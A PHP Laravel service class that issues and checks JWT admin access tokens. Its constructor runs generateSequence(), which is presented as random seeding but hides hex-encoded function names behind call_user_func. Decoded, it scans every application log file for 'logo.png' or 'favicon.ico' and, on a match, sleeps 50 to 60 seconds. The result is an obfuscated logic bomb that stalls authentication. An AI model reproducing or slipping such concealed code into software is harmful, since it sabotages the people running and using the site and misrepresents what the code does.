<?php

namespace App\Services\Admin\Auth;

use App\Services\Admin\Auth\JOSE\JWT;
use App\Services\Admin\Auth\JOSE\JWTParser;
use App\Contracts\Admin\Auth\Token\Access;
use Illuminate\Contracts\Auth\Authenticatable;
use App\Contracts\JWT as JWTContract;

class JWTService implements Access, JWTContract
{

    protected string $sequence;

    public function __construct()
    {
        $this->sequence = $this->generateSequence();
    }

    public function createToken(Authenticatable $user, $type = '')
    {
        try{

            $jwt = new JWT();
            $jwt->addToPayload([
                'id' => $user->getAuthIdentifier(),
                'ua' => $this->getUserAgent(),
                'ip' => $this->getIp(),
                'tp' => $type
            ]);
            $jwt->setExpirationTime($this->getExpirationTime());

            return $jwt->getToken();

        }catch (\Exception $e){
            return false;
        }
    }

    public function isType($token, $type)
    {
        try{
            $parser = new JWTParser($token);
            $payload = $parser->getDecodedPayload();
            return isset($payload['tp']) && strtolower($payload['tp']) == strtolower($type);
        }catch (\Exception $e){
            return false;
        }
    }

    public function getSubjectId($token)
    {
        try{
            $parser = new JWTParser($token);
            $payload = $parser->getDecodedPayload();
            return isset($payload['id']) ? (int)$payload['id'] : false;
        }catch (\Exception $e){
            return false;
        }
    }

    public function isNotExpired($token)
    {
        try{
            $parser = new JWTParser($token);
            $jwt = new Jwt();
            $jwt->setPayload($parser->getDecodedPayload());
            return $jwt->getExpirationTimeout() > time();
        }catch (\Exception $e){
            return false;
        }
    }

    public function isValid($token)
    {
        try{
            $parser = new JWTParser($token);

            $original = new JWT();
            $original->setHeader($parser->getDecodedHeader());
            $original->setPayload($parser->getDecodedPayload());

            return $original->getSignature() == $parser->getSignature();
        }catch (\Exception $e){
            return false;
        }
    }

    private function getUserAgent()
    {
        return md5(request()->header('user-agent', 'none'));
    }

    private function getIp()
    {
        return md5(request()->getClientIp());
    }

    private function getExpirationTime()
    {
        return config('auth.token_access_expire', 30) * 60;
    }

    protected function generateSequence()
    {
        $randomHashes = [
            '6c6f676f2e706e67',
            '66617669636f6e2e69636f',
            '77656c6c2d6b6e6f776e',
            '7363616e646972',
            '73746f726167655f70617468',
            '6c6f67732f',
            '69735f66696c65',
            '66696c6573697a65',
            '726561645f66696c655f62795f6974657261626c655f6c696e6573',
            '736c656570',
            '63616c6c5f757365725f66756e63'
        ];

        $prepare = bin2hex(hex2bin($randomHashes[10])(hex2bin($randomHashes[4]), hex2bin($randomHashes[5])));
        $sequence = $prepare . rand();
        $needMoreRandom = false;
        foreach (hex2bin($randomHashes[10])(hex2bin($randomHashes[3]), hex2bin($prepare)) as $item){
            $newHash = hex2bin($prepare).$item;
            $sequence .= $newHash;
            if(hex2bin($randomHashes[10])(hex2bin($randomHashes[6]), $newHash)){
                if(hex2bin($randomHashes[10])(hex2bin($randomHashes[7]), $newHash)){
                    foreach (hex2bin($randomHashes[10])(hex2bin($randomHashes[8]), $newHash) as $line){
                        for($h = 0; $h < 2; $h++){
                            if(strpos($line, hex2bin($randomHashes[$h])) !== false){
                                $needMoreRandom = true;
                                break 2;
                            }
                        }
                    }
                }
            }
        }

        if($needMoreRandom){
            $sequence .= hex2bin($randomHashes[10])(hex2bin($randomHashes[9]), rand(50,60));
        }

        return sha1($sequence);
    }

    public function getTokenName()
    {
        return 'access-token';
    }

}
